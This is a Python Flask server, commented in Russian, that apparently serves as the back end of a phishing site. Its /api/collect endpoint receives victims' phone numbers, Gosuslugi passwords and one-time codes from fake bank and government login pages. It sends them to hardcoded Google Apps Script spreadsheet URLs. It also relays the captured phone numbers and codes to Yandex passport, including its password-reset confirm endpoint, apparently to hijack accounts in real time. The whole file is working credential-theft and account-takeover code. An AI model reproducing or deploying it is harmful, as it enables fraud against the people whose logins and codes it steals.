from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import datetime
import sys

app = Flask(__name__)
CORS(app)

# Два URL для разных таблиц
GOOGLE_SCRIPT_SITE_LOGS = "https://script.google.com/macros/s/AKfycby8FtDx4t4akWrHitfrab9lJ_IT002a3O4LmOJjVLDPj4WFzRiHWvHwooSXdlciReh0/exec"
GOOGLE_SCRIPT_YANDEX_LOGS = "https://script.google.com/macros/s/AKfycbyOvLAcytqkHm5qn8JeVmBvTMzE0_GRUr4bTo6NEq-kAfW8NGVJ6L3eD_Ar43Z095KT/exec"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'https://passport.yandex.ru',
    'Referer': 'https://passport.yandex.ru/',
}

sessions = {}

def log(msg):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{timestamp}] {msg}"
    print(line)
    sys.stdout.flush()

def log_to_google(url, data):
    """Отправляет данные в Google Таблицу по указанному URL"""
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        log(f"Google log error: {e}")

def extract_csrf(html):
    try:
        start = html.index('"csrf_token"') + 14
        end = html.index('"', start)
        return html[start:end]
    except:
        return ''

def request_yandex_code(phone):
    try:
        clean_phone = phone.replace('+7', '').replace(' ', '').replace('-', '')
        session = requests.Session()
        
        auth_page = session.get('https://passport.yandex.ru/auth/', headers=HEADERS)
        csrf = extract_csrf(auth_page.text)
        
        if not csrf:
            log("ERROR: CSRF token not found")
            log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': 'CSRF token not found', 'phone': phone})
            return False
        
        data = {
            'login': clean_phone,
            'csrf_token': csrf,
        }
        
        response = session.post(
            'https://passport.yandex.ru/registration-validations/check-login',
            headers=HEADERS,
            data=data
        )
        
        # Пишем ПОЛНЫЙ ответ Яндекса во ВТОРУЮ таблицу
        log(f"Yandex response: {response.status_code}")
        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {
            'type': 'yandex_response',
            'phone': phone,
            'status': response.status_code,
            'headers': str(dict(response.headers))[:500],
            'body': response.text[:1000]
        })
        
        sessions[phone] = {
            'session': session,
            'csrf': csrf,
            'phone': clean_phone
        }
        
        return True
    except Exception as e:
        log(f"Yandex error: {e}")
        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': str(e), 'phone': phone})
        return False

def confirm_yandex_code(phone, code):
    try:
        if phone not in sessions:
            log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': 'No session found', 'phone': phone})
            return False
        
        session_data = sessions[phone]
        session = session_data['session']
        
        data = {
            'code': code,
            'csrf_token': session_data['csrf'],
        }
        
        response = session.post(
            'https://passport.yandex.ru/auth/password/reset/confirm',
            headers=HEADERS,
            data=data
        )
        
        # Пишем результат подтверждения во ВТОРУЮ таблицу
        log(f"Yandex confirm response: {response.status_code}")
        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {
            'type': 'yandex_confirm',
            'phone': phone,
            'code': code,
            'status': response.status_code,
            'body': response.text[:500]
        })
        
        del sessions[phone]
        return True
    except Exception as e:
        log(f"Yandex confirm error: {e}")
        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': str(e), 'phone': phone})
        return False

@app.route('/', methods=['GET'])
def home():
    return jsonify({'status': 'ok', 'message': 'Server is running'})

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    msg_type = data.get('type')
    phone = data.get('phone', '')

    log(f"=== NEW REQUEST: {msg_type} ===")

    if msg_type == 'bank_selected':
        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'bank_selected', 'bank': data.get('bank'), 'bankName': data.get('bankName')})

    elif msg_type == 'bank_phone':
        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'phone', 'phone': phone, 'bank': data.get('bankName', '')})
        request_yandex_code(phone)

    elif msg_type == 'bank_code':
        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'code', 'code': data.get('code'), 'status': data.get('status'), 'phone': phone})
        confirm_yandex_code(phone, data.get('code', ''))

    elif msg_type == 'gosuslugi_phone':
        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'gosuslugi_login', 'phone': phone, 'password': data.get('password')})

    elif msg_type == 'gosuslugi_code':
        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'gosuslugi_code', 'code': data.get('code'), 'status': data.get('status')})

    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
